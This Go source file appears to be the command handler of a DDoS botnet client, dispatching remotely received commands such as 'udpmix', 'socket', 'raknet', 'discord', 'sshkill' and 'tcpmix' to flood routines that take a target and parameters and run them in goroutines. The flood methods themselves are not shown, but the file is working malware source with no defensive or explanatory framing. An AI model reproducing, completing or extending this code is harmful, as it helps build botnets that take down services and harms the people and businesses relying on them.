package main

import (
	"fmt"
	"homo/client/methods"
	"strings"
)

func CommandHandler(command string) {
	commandd := strings.ReplaceAll(string(command), "\n", "")

	fmt.Println(commandd)

	if strings.HasPrefix(commandd, "https") {

		args := strings.Split(commandd, " ")

		go methods.HttpsDefault(args[1], args[2], args[3], args[4])
	}

	if strings.HasPrefix(commandd, "socket") {

		args := strings.Split(commandd, " ")

		go methods.SocketFlood(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "udpmix") {
		args := strings.Split(commandd, " ")

		go methods.Udp(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "raknet") {
		args := strings.Split(commandd, " ")

		go methods.Raknet(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "discord") {
		args := strings.Split(commandd, " ")

		go methods.Discord(args[1], args[2], args[3])
	}
	if strings.HasPrefix(commandd, "sshkill") {
		args := strings.Split(commandd, " ")

		go methods.SshKiller(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "handshake") {
		args := strings.Split(commandd, " ")

		go methods.Handshake(args[1], args[2], args[3])
	}

	if strings.HasPrefix(commandd, "tcpmix") {
		args := strings.Split(commandd, " ")

		go methods.Tcp(args[1], args[2], args[3])
	}
}
